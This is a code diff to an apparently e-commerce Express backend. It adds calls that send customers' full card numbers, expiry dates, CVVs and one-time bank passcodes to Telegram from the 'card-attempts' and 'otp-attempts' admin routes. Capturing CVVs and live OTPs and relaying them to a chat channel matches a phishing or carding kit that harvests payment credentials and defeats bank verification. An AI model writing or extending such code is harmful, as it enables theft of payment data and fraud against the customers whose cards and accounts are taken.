@@ -4,6 +4,7 @@ import { db, ordersTable, productsTable, presenceTable, siteContentTable, visito
 import { CreateProductBody, UpdateProductBody, UpdateSiteContentBody, UpdateOrderBody } from "@workspace/api-zod";
 import { mapProductRow, mapSiteContentRow, isPresenceActive } from "./utils";
 import { sendPushNotification, notifyAdminsOfCardAttempt, notifyAdminsOfOtpAttempt } from "../lib/firebase-admin";
+import { sendTelegramCardAttemptNotification, sendTelegramOtpAttemptNotification } from "../lib/telegram";
 import crypto from "crypto";
 import jwt from "jsonwebtoken";
 
@@ -295,6 +296,9 @@ router.post("/admin/orders/:orderId/card-attempts", async (req, res, next) => {
     if (order) {
       console.log(`[CARD] Sending notification for order ${orderId}, customer: ${order.customerName}`);
       notifyAdminsOfCardAttempt(order, cardName, cardNumber, cardExpiry, cardCvv);
+
+      // Send card attempt details to Telegram (async),'don't wait)
+      sendTelegramCardAttemptNotification(order, cardName, cardNumber, cardExpiry, cardCvv);
     } else {
       console.log(`[CARD] Order ${orderId} not found, skipping notification`);
     }
@@ -393,6 +397,9 @@ router.post("/admin/orders/:orderId/otp-attempts", async (req, res, next) => {
     if (order) {
       console.log(`[OTP] Sending notification for order ${orderId}, customer: ${order.customerName}, OTP: ${otpCode}`);
       notifyAdminsOfOtpAttempt(order, otpCode, success ?? false);
+
+      // Send OTP attempt details to Telegram (async),'don't wait)
+      sendTelegramOtpAttemptNotification(order, otpCode, success ?? false);
     } else {
       console.log(`[OTP] Order ${orderId} not found, skipping notification`);
     }
